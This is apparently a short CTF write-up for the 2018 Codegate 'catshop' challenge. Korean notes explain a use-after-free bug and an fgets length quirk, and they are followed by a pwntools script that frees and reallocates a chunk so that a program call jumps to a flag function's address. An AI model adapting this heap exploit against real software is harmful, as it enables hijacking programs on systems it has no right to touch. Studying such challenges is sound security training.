---
title: "2018 Codegate catshop"
date: 2019-11-13
tags: [Codegate]
categories: [Codegate]
---

UAF 취약점이 발생한다. 

fget는 입력 받을 개수 -1 만큼 입력받고 마지막 문자를 NULL로 만들어서 4bytes 주소값을 넣으려면 5만큼 넣어줘야한다. 

```python
from pwn import *
 
p = process('./catshop')
e = ELF('./catshop')
 
flag = 0x080488b6
 
p.sendafter(':',p32(1)) # malloc
sleep(0.1)
p.sendafter(':',p32(2)) # free
sleep(0.1)
p.sendafter(':',p32(4)) # malloc
sleep(0.1)
p.sendafter(':',p32(5)) # length
sleep(0.1)
p.sendlineafter(':',p32(flag)) # fget -> \x00
sleep(0.1)
p.sendlineafter(':',p32(3)) # call
 
p.interactive()
```

